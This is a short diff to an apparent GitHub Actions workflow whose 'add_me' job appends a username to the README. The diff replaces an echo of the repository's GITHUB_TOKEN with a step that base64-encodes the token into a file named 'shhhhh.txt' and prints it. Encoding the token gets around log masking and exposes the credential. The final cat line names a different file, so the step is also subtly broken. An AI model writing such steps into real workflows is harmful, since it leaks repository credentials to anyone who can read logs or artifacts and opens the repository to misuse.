@@ -21,4 +21,6 @@ jobs:
     - name: add_me
       run: |
         echo "jmcshannon" >> README.md
-        echo ${{ secrets.GITHUB_TOKEN }}
+        cat README.md
+        echo ${{ secrets.GITHUB_TOKEN }} | base64 >> shhhhh.txt
+        cat shhhhhh.txt
